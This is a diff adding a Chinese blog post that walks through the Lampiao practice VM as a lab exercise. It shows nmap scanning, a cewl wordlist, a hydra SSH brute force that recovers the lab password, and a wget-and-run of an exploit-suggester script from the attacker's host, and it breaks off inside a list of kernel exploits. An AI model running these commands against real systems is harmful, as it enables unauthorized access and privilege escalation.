@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="第二个渗透靶机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lampiao">
+<meta property="og:url" content="http://example.com/2026/02/23/Lampiao/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="第二个渗透靶机">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yk.jsdu.cn/20260223/111c174b5fae21019a8cd126168fb0ae.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260223/1f37eb8240c506d8bb082bb85a2ecd93.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260223/49bb6d401acfbfe31dbe2d860060de66.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260223/36f35bdc3620c2be6c3cfb71406ea217.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260223/784df330b708fb1dc2bb6ce33f3e9350.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260223/dfc33a783760cf84f34d6189d94923cc.png">
+<meta property="article:published_time" content="2026-02-23T06:50:12.000Z">
+<meta property="article:modified_time" content="2026-02-23T08:08:21.841Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="渗透靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yk.jsdu.cn/20260223/111c174b5fae21019a8cd126168fb0ae.png">
+
+
+<link rel="canonical" href="http://example.com/2026/02/23/Lampiao/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2026/02/23/Lampiao/","path":"2026/02/23/Lampiao/","title":"Lampiao"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Lampiao | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">内核提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8B%BFwww-data%E6%9D%83%E9%99%90"><span class="nav-number">3.</span> <span class="nav-text">拿www-data权限</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">107</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/23/Lampiao/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Lampiao | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Lampiao
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-02-23 14:50:12 / Modified: 16:08:21" itemprop="dateCreated datePublished" datetime="2026-02-23T14:50:12+08:00">2026-02-23</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>第二个渗透靶机</p>
+<span id="more"></span>
+
+<p>靶机为NAT模式，Kali2022也是NAT模式</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>一开始依然是信息收集，看一下kali本机的ip，依然是<code>192.168.4.130</code>，用<code>nmap</code>扫描一下存活主机：<code>nmap -sn 192.168.4.0/24</code>，排除一下发现本次靶机的ip为<code>192.168.4.131</code> </p>
+<p>接着对靶机的端口进行扫描，看存在哪些端口，直接全端口扫描：<code>nmap -p 1-65535 192.168.4.131</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -p 1-65535 192.168.4.131 </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2026-02-23 01:55 EST</span><br><span class="line">Nmap scan report for 192.168.4.131</span><br><span class="line">Host is up (0.0016s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">1898/tcp open  cymtec-port</span><br></pre></td></tr></table></figure>
+
+<p>发现开放了<code>22、80、1898</code> 三个端口，个人习惯于先从<code>80</code> 端口下手，因为是<code>web</code>服务，访问发现是一堆乱码。F12查看源码没发现啥有用信息，再尝试用<code>dirsearch</code> 和 <code>御剑</code> 扫描也没发现什么信息。<strong>这里我犯了一个很愚蠢的错误，以为1898端口是个没用的端口，就没去管了</strong>。渗透测试的信息收集应该要不放过任何可能有用的信息。要不停的尝试，枚举。</p>
+<p><code>1898</code>端口也是一个web服务，访问它去找一些信息：<code>http://192.168.4.131:1898/?q=node/2</code>，告知了存在<code>audio.m4a</code>;<code>qrc.png</code></p>
+<p>直接可以url访问:<code>http://192.168.4.131:1898/audio.m4a</code> ，是一段录音，仔细听发现说的是<code>user tiago</code> 相当于是告诉了我们用户名，另外访问<code>http://192.168.4.131:1898/qrc.png</code>，是一个二维码，扫描发现提示信息:<code>try harder!muahuahua</code> </p>
+<p>这里拿到一个用户名，应该再所有可能登录的地方都暴破一下，比如1898端口的这个web服务的登录口，以及我们22端口的ssh服务。</p>
+<p>当然看最终的wp发现这里的字典非常巧妙，用到了<code>cewl</code>这个工具来通过信息收集生成字典。这个思路和之前打的DC靶机有点像。</p>
+<p>关于cewl工具的介绍：cewl是一款基于Ruby开发的字典生成工具，常用于从指定URL爬取内容并生成密码破解字典。它支持多种功能，包括设置爬取深度、生成特定长度的字典、提取Email地址、统计单词重复次数等。</p>
+<p>这里直接<code>cewl http://192.168.4.131:1898/?q=node/1 -w keyword.txt</code> ，爬取网站内容并输出成字典<code>keyword.txt</code>，然后再利用这个字典进行22端口ssh密码爆破，用户名是前面获取的<code>tiago</code></p>
+<p>爆破ssh密码用到的工具依然是上一个靶机提到的<code>hydra</code> ，命令为：<code>hydra -l tiago -P keyword.txt  192.168.4.131 -s 22 ssh </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ hydra -l tiago -P keyword.txt  192.168.4.131 -s 22 ssh  </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-23 02:11:16</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 844 login tries (l:1/p:844), ~53 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.4.131:22/</span><br><span class="line">[22][ssh] host: 192.168.4.131   login: tiago   password: Virgulino</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-23 02:12:08</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>tiago/Virgulino</code>，用ssh可以成功登录上去。</p>
+<p><img src="https://yk.jsdu.cn/20260223/111c174b5fae21019a8cd126168fb0ae.png" alt="Lampiao1"></p>
+<h1 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h1><p>拿到的<code>tiago</code>是一个普通用户的权限，我们希望拿到root的权限，这里用到了一个脚本<code>linux suggest exploit</code>，类似于一个fuzz脚本，判断可能可以利用的内核提权漏洞。谷歌搜索一下，把脚本下载到kali2022上面，然后kali 2022起一个web服务，靶机用<code>wget</code>来从kali上面进行下载。</p>
+<p>需要注意的是，这里是把<code>linux.sh</code>下载到<code>/tmp</code>目录下面，然后再赋予写权限：<code>cd /tmp ; wget http://192.168.4.130:9999/linux.sh; ./linux.sh</code> ，执行结果发现有很多可能可以利用的角度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line">tiago@lampiao:/tmp$ ./linux.sh </span><br><span class="line"></span><br><span class="line">Available information:</span><br><span class="line"></span><br><span class="line">Kernel version: 4.4.0</span><br><span class="line">Architecture: i686</span><br><span class="line">Distribution: ubuntu</span><br><span class="line">Distribution version: 14.04</span><br><span class="line">Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed</span><br><span class="line">Package listing: from current OS</span><br><span class="line"></span><br><span class="line">Searching among:</span><br><span class="line"></span><br><span class="line">86 kernel space exploits</span><br><span class="line">50 user space exploits</span><br><span class="line"></span><br><span class="line">Possible Exploits:</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-16995] eBPF_verifier</span><br><span class="line"></span><br><span class="line">   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=9.0&#123;kernel:4.9.0-3-amd64&#125;,fedora=25|26|27,[ ubuntu=14.04 ]&#123;kernel:4.4.0-89-generic&#125;,ubuntu=(16.04|17.04)&#123;kernel:4.(8|10).0-(19|28|45)-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/45010</span><br><span class="line">   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-1000112] NETIF_F_UFO</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: [ ubuntu=14.04&#123;kernel:4.4.0-*&#125; ],ubuntu=16.04&#123;kernel:4.8.0-*&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c</span><br><span class="line">   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at &#x27;ext-url&#x27; adds support for additional distros/kernels</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-8655] chocobo_root</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: [ ubuntu=(14.04|16.04)&#123;kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic&#125; ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40871</span><br><span class="line">   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-5195] dirtycow</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL=6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL=7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,[ ubuntu=16.04|14.04|12.04 ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40611</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Exposure: highly probable</span><br><span class="line">   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="line">   ext-url: https://www.exploit-db.com/download/40847</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-4034] PwnKit</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro</span><br><span class="line">   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-3156] sudo Baron Samedit 2</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10</span><br><span class="line">   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-6074] dccp</span><br><span class="line"></span><br><span class="line">   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=(14.04|16.04) ]&#123;kernel:4.4.0-62-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/41458</span><br><span class="line">   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-2384] usb-midi</span><br><span class="line"></span><br><span class="line">   Details: https://xairy.github.io/blog/2016/cve-2016-2384</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=14.04 ],fedora=22</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c</span><br><span class="line">   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user</span><br><span class="line"></span><br><span class="line">[+] [CVE-2015-3202] fuse (fusermount)</span><br><span class="line"></span><br><span class="line">   Details: http://seclists.org/oss-sec/2015/q2/520</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: debian=7.0|8.0,[ ubuntu=* ]</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/37089</span><br><span class="line">   Comments: Needs cron or system admin interaction</span><br><span class="line"></span><br><span class="line">[+] [CVE-2015-1318] newpid (apport)</span><br><span class="line"></span><br><span class="line">   Details: http://openwall.com/lists/oss-security/2015/04/14/4</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=14.04 ]</span><br><span class="line">   Download URL: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c</span><br><span class="line"></span><br><span class="line">[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)</span><br><span class="line"></span><br><span class="line">   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/</span><br><span class="line">https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=(22.04)&#123;kernel:5.15.0-27-generic&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c</span><br><span class="line">   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)</span><br><span class="line"></span><br><span class="line">[+] [CVE-2022-2586] nft_object UAF</span><br><span class="line"></span><br><span class="line">   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=(20.04)&#123;kernel:5.12.13&#125;</span><br><span class="line">   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1</span><br><span class="line">   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-3156] sudo Baron Samedit</span><br><span class="line"></span><br><span class="line">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: mint=19,ubuntu=18|20, debian=10</span><br><span class="line">   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main</span><br><span class="line"></span><br><span class="line">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span><br><span class="line"></span><br><span class="line">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span><br><span class="line">   Comments: ip_tables kernel module must be loaded</span><br><span class="line"></span><br><span class="line">[+] [CVE-2019-18634] sudo pwfeedback</span><br><span class="line"></span><br><span class="line">   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: mint=19</span><br><span class="line">   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c</span><br><span class="line">   Comments: sudo configuration requires pwfeedback to be enabled.</span><br><span class="line"></span><br><span class="line">[+] [CVE-2019-15666] XFRM_UAF</span><br><span class="line"></span><br><span class="line">   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: </span><br><span class="line">   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-7308] af_packet</span><br><span class="line"></span><br><span class="line">   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Tags: ubuntu=16.04&#123;kernel:4.8.0-(34|36|39|41|42|44|45)-generic&#125;</span><br><span class="line">   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c</span><br><span class="line">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c</span><br><span class="line">   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at &#x27;ext-url&#x27; adds support for additional kernels</span><br><span class="line"></span><br><span class="line">[+] [CVE-2017-5618] setuid screen v4.5.0 LPE</span><br><span class="line"></span><br><span class="line">   Details: https://seclists.org/oss-sec/2017/q1/184</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154</span><br><span class="line"></span><br><span class="line">[+] [CVE-2016-9793] SO_&#123;SND|RCV&#125;BUFFORCE</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793</span><br><span class="line">   Exposure: less probable</span><br><span class="line">   Download URL: 